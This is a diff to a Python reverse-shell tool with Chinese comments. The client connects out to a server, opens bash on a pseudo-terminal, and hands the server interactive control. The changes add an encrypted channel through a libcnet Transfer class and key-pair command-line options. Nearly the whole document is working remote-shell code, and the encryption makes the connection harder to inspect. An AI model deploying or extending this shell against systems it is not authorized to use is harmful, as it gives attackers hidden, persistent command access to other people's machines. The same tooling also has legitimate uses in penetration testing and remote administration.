@@ -27,6 +27,9 @@ import selectors
 from subprocess import Popen
 from logging.handlers import TimedRotatingFileHandler
 
+from libcnet import (
+    Transfer,
+)
 
 SHELL='bash'
 STDIN = sys.stdin.fileno()
@@ -70,7 +73,7 @@ def signal_SIGWINCH_handle(sock, sigNum, frame):
     usage: lambda sigNum, frame: signal_SIGWINCH_handle(sock, sigNum, frame)
     """
     size = get_pty_size(STDOUT)
-    # logging 要异步的信号量模式下不安全。在 signal handle 里不要用 logging
+    # logging 在异步的信号量模式下不安全。在 signal handle 里不要用 logging
     # logger.debug(f"窗口大小改变: {size}")
     # logger.debug("sigwinch 向对端发送新窗口大小")
     # set_pty_size(STDOUT, *size)
@@ -141,22 +144,52 @@ class RecvSend:
     def close(self):
         self.sock.close()
 
+class CRecvSend:
+
+    def __init__(self, sock):
+        if not isinstance(sock, Transfer):
+            raise ValueError(f"要使用加密功能，需要libcnet.py库")
+
+        self.sock = sock
+    
+    def read(self):
+        payload = self.sock.read()
+        if payload == b"":
+            return PacketType.EXIT, b""
+
+        typ = PacketType(payload[0])
+        data = payload[1:]
+        logger.debug(f"sock recv --> type: {typ.name}, data: {data}")
+        return typ, data
+    
+    def write(self, typ, data):
+        payload = io.BytesIO()
+        payload.write(struct.pack("!B", typ))
+        payload.write(data)
+
+        return self.sock.write(payload.getvalue())
+
+    def fileno(self):
+        return self.sock.fileno()
+
+    def close(self):
+        self.sock.close()
 
 
-def socketshell(conn):
+
+def socketshell(sock):
     try:
         env = os.environ.copy()
         pty_master, pty_slave = pty.openpty()
 
         ss = selectors.DefaultSelector()
-        sock = RecvSend(conn)
 
         ss.register(pty_master, selectors.EVENT_READ)
         ss.register(sock, selectors.EVENT_READ)
 
         # 这两个种在linux上都可以,目前还没看出区别在哪。
-        # p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)
-        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid)
+        # p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True, env=env)
+        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, env=env)
 
         while p.poll() is None:
             for key, event in ss.select(0.05):
@@ -202,8 +235,12 @@ def socketshell(conn):
         logger.info("sock exit")
 
 
-def server(addr, port):
-    server_addr = (addr, port)
+def server(args):
+    server_addr = (args.addr, args.port)
+
+    Spriv = args.Spriv 
+    Spub = tuple(args.Spub)
+
     logger.info(f"{sys.argv[0]} listen: {server_addr}")
 
     try:
@@ -218,7 +255,12 @@ def server(addr, port):
         # client_sock.setblocking(False)
         logger.info(f"有反向shell连接上: {addr}")
 
-        client = RecvSend(client_sock)
+        if Spriv:
+            c = Transfer(client_sock)
+            c.server(Spriv, Spub)
+            client = CRecvSend(c)
+        else:
+            client = RecvSend(client_sock)
         # 
         signal.signal(signal.SIGWINCH, lambda sig, frame: signal_SIGWINCH_handle(client, sig, frame))
 
@@ -292,7 +334,12 @@ def server(addr, port):
         logger.info("logout")
 
 
-def client(addr, port=6789):
+def client(args):
+    addr = args.addr
+    port = args.port
+    Spriv = args.Spriv 
+    Spub = args.Spub[0]
+
     if addr == "":
         logger.info("client 需要 server 地址")
         return
@@ -324,6 +371,13 @@ def client(addr, port=6789):
 
         logger.info(f"client connect: {server_addr}")
         # sock.setblocking(False) # 又用同步的方式去使用，会报错误：BlockingIOError: [Errno 11] Resource temporarily unavailable
+        if Spriv:
+            c = Transfer(sock)
+            c.connect(Spriv, Spub)
+            sock = CRecvSend(c)
+        else:
+            sock = RecvSend(sock)
+
         th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
         th.start()
         th.join()
@@ -353,18 +407,25 @@ def main():
     client_func.add_argument("--addr", default="", help="需要连接的IP或域名")
     client_func.add_argument("--port", default=6789, type=int, help="端口")
 
+
+    client_func.add_argument("--Spriv", action="store", help="使用加密通信的私钥。")
+    client_func.add_argument("--Spub", action="store", nargs="+", help="使用加密通信的对方公钥，server端可能有多个。")
+
+    server_func.add_argument("--Spriv", action="store", help="使用加密通信的私钥。")
+    server_func.add_argument("--Spub", action="store", nargs="+", help="使用加密通信的对方公钥，server端可能有多个。")
+
     parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)
 
     parse.add_argument("--debug", action="store_true", help=argparse.SUPPRESS)
 
-    server_func.set_defaults(func=lambda args :server(args.addr, args.port))
+    server_func.set_defaults(func=server)
     
-    client_func.set_defaults(func=lambda args :client(args.addr, args.port))
+    client_func.set_defaults(func=client)
 
     args = parse.parse_args()
 
     if args.parse:
-        logger.info(args)
+        print(args)
         sys.exit(0)
     
     if args.debug:
